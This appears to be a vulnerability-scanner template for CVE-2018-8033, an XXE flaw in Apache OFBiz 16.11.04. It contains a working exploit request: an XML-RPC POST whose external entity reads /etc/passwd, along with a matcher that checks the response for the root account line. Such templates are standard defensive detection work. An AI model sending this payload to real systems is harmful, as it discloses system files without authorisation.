id: CVE-2018-8033

info:
  name: Apache OFBiz XXE
  author: pikpikcu
  severity: high
  description: XXE injection (file disclosure) exploit for Apache OFBiz 16.11.04
  tags: cve,cve2018,apache,ofbiz,xxe
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.50
    cve-id: CVE-2018-8033
    cwe-id: CWE-200
  reference:
    - https://lists.apache.org/thread.html/e8fb551e86e901932081f81ee9985bb72052b4d412f23d89b1282777@%3Cuser.ofbiz.apache.org%3E

manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /webtools/control/xmlrpc
            headers:
                Content-Type: application/xml
            body: <?xml version="1.0"?><!DOCTYPE x [<!ENTITY disclose SYSTEM "file://///etc/passwd">]><methodCall><methodName>&disclose;</methodName></methodCall>
            follow_redirects: false
        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
expression: r0()
